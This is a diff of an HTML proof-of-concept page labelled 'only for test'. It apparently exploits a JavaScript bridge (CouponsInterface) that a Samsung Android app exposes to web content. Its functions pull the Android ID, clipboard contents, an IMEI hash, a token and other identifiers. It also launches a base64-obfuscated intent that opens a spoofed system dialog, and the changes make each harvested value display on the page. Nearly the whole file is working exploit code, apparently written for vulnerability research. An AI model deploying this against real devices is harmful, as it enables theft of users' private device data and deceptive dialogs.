@@ -5,40 +5,47 @@
 		var androidId = CouponsInterface.getAndroidId();
 		alert("CouponsInterface.getAndroidId() can be called: " + androidId);
 		console.log("getAndroidId(): " + androidId);
+		document.getElementById('p0').innerHTML = "getAndroidId(): " + androidId;
 		return androidId;
 	}
 	
 	function getClientInfo() {
 	    var clientInfo = CouponsInterface.getClientInfo();
 		alert("CouponsInterface.getClientInfo(): " + clientInfo);
+		document.getElementById('p1').innerHTML = "getClientInfo(): " + clientInfo;
 	}
 	
 	function getClipBoardString() {
 		var str = CouponsInterface.getClipBoardString();
 		alert("CouponsInterface.getClipBoardString(): " + str);
+		document.getElementById('p2').innerHTML = "getClipBoardString(): " + str;
 	}
 	
 	function getCouponsData() {
 		console.log("getCouponsData() method");
 		var str = CouponsInterface.getCouponsData();
 		alert("getCouponsData(): " + str);
+		document.getElementById('p3').innerHTML = "getCouponsData(): " + str;
 	}
 	
 	function getReverseId() {
 		console.log("getReverseId() method");
 		var id = CouponsInterface.getReverseId();
 		alert("getReverseId(): " + id);
+		document.getElementById('p4').innerHTML = "getReverseId(): " + id;
 	}
 
     function getSAID() {
 		console.log("getSAID() method");
 		var id = CouponsInterface.getSAID();
 		alert("getSAID(): " + id);
+		document.getElementById('p5').innerHTML = "getSAID(): " + id;
 	}
 
 	function showSha256DeviceIMEI(imei) {
 	    console.log("showSha256DeviceIMEI() method");
 	    alert("showSha256DeviceIMEI(): " + imei);
+		document.getElementById('p6').innerHTML = "getSha256DeviceIMEI(): " + imei;
 	}
 
 	function getSha256DeviceIMEI() {
@@ -50,6 +57,7 @@
     function showToken(token) {
         console.log("showToken() method");
         alert("showToken(): " + token);
+		document.getElementById('p7').innerHTML = "getToken(): " + token;
     }
 
 	function getToken() {
@@ -62,6 +70,7 @@
 	    var isOn = CouponsInterface.isShoppingAssistantOn();
 	    alert("isShoppingAssistantOn(): " + isOn);
 	    console.log("isShoppingAssistantOn(): " + isOn);
+		document.getElementById('p8').innerHTML = "isShoppingAssistantOn(): " + isOn;
 	}
 
 	function openCouponPage() {
@@ -70,31 +79,60 @@
 		var a = "aW50ZW50OiNJbnRlbnQ7Y29tcG9uZW50PWNvbS5zYW1zdW5nLmFuZHJvaWQuYXBwLnNyZW1pbmRlci8uY29tbW9uLkNvbW1vbkRpYWxvZ0FjdGl2aXR5O1MuZGlhbG9nX25lZ2F0aXZlX2J1dHRvbj1Db250aW51ZTtTLnBvc2l0aXZlX2FjdGlvbj07Uy5uZWdhdGl2ZV9hY3Rpb249O1MuZGlhbG9nX21lc3NhZ2U9Q29uZ3JhdHVsYXRpb25zJTIwdG8lMjB5b3UhO1MuZGlhbG9nX3RpdGxlPUhlbGxvO1MuZGlhbG9nX2NhbGxlcj07Uy5kaWFsb2dfcG9zaXRpdmVfYnV0dG9uPUNhbmNlbDtlbmQ=";
         var b = window.atob(a)
 	    CouponsInterface.openCouponPage(c, b, title);
+		document.getElementById('p9').innerHTML = "openCouponPage() is called.";
 	}
 
 </script>
-<style type="text/css">
-button {
-	white-space: normal;
+<style>
+h2 {
+  font-size: 1.8em;
 }
-input[type="button"] {
-	white-space: normal;
+
+body, p, input, button {
+    font-size: 1.5em;
 }
 </style>
 </head>
 <body>
-	<h3>PoC</h3>
-	<p>
-		<button onclick="getAndroidId()">getAndroidId()</button>		<br /><br />
-        <button onclick="getClientInfo()">getClientInfo()</button>		<br /><br />
-        <button onclick="getClipBoardString()">getClipBoardString()</button>		<br /><br />
-        <button onclick="getCouponsData()">getCouponsData()</button>		<br /><br />
-        <button onclick="getReverseId()">getReverseId()</button>		<br /><br />
-        <button onclick="getSha256DeviceIMEI()">getSha256DeviceIMEI()</button>		<br /><br />
-        <button onclick="getToken()">getToken()</button>		<br /><br />
-        <button onclick="isShoppingAssistantOn()">isShoppingAssistantOn()</button>		<br /><br />
-        <button onclick="openCouponPage()">openCouponPage()</button>		<br /><br />
-	</p>
+	<h2>PoC file: Only for Test</h2>
+	<p>Note: Do Not Use this file for any other illegal purpose except study or test.</p>
+
+	<button onclick="getAndroidId()">getAndroidId()</button>
+	<p id="p1">Hello World!</p>
+	<br /><br />
+
+	<button onclick="getClientInfo()">getClientInfo()</button>
+	<p id="p2">Hello World!</p>
+	<br /><br />
+
+	<button onclick="getClipBoardString()">getClipBoardString()</button>
+	<p id="p3">Hello World!</p>
+	<br /><br />
+
+	<button onclick="getCouponsData()">getCouponsData()</button>
+	<p id="p4">Hello World!</p>
+	<br /><br />
+
+	<button onclick="getReverseId()">getReverseId()</button>
+	<p id="p5">Hello World!</p>
+	<br /><br />
+
+	<button onclick="getSha256DeviceIMEI()">getSha256DeviceIMEI()</button>
+	<p id="p6">Hello World!</p>
+	<br /><br />
+
+	<button onclick="getToken()">getToken()</button>
+	<p id="p7">Hello World!</p>
+	<br /><br />
+
+	<button onclick="isShoppingAssistantOn()">isShoppingAssistantOn()</button>
+	<p id="p8">Hello World!</p>
+	<br /><br />
+
+	<button onclick="openCouponPage()">openCouponPage()</button>
+	<p id="p9">Hello World!</p>
+	<br /><br />
+
 </body>
 </html>
 
